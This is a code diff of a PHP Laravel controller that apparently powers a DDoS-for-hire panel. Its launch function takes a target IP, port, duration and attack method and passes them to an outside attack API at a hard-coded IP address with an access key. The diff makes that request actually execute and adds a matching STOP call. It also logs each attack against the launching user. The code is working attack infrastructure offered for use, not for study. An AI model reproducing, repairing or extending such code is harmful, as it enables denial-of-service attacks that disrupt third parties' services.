@@ -48,21 +48,25 @@ class attackController extends Controller
         // ]);
 
         $url = curl_init();
-        curl_setopt($url, CURLOPT_URL,'http://77.83.247.18/speed.php?'.'host='.$request->ip.'&port='.$request->port.'&time='.$request->length.'&method='.$request->method);
+        curl_setopt($url, CURLOPT_URL,'http://77.83.247.18/api.php?'.'host='.$request->ip.'&port='.$request->port.'&time='.$request->length.'&method='.$request->method.'&key=123456');
         curl_setopt($url, CURLOPT_RETURNTRANSFER, true);
-        curl_close($url);
         curl_exec($url);
+        curl_close($url);
         
         attack::create(['ip' => $request->ip, 'port' => $request->port, 'length' => $request->length, 'method' => $request->method,'launcher_id'=> Auth::user()->id, 'launched_at' => Carbon::now(), 'finished_at'=>Carbon::now()->addSecond($request->length)]);
         return redirect('/attack');
     }
 
-    public function stopAttack($id)
+    public function stopAttack(Request $request, $id)
     {
         $attack = attack::find($id);
         $attack->state = 0;
         $attack->save();
-        //api layer4 stop
+        $url = curl_init();
+        curl_setopt($url, CURLOPT_URL,'http://77.83.247.18/api.php?'.'host='.$request->ip.'&port='.$request->port.'&time='.$request->length.'&method=STOP'.'&key=123456');
+        curl_setopt($url, CURLOPT_RETURNTRANSFER, true);
+        curl_exec($url);
+        curl_close($url);
         return redirect('/attack');
     }
 }
